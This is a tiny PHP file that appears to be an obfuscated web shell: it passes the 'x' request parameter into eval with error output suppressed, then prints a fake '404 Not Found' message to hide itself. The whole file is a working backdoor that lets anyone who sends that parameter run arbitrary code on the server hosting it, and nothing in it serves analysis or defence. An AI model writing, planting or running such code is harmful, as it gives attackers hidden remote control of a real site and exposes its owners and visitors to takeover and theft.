<?php
function x(){
 return $x=$_REQUEST['x'];
}
for ($x=0; $x<=0; $x++) {
 @eval(str_replace("x","","x").x()."");
 if ($x<=0) {
  print_r('404 Not Found');
  exit();
 }
}
?>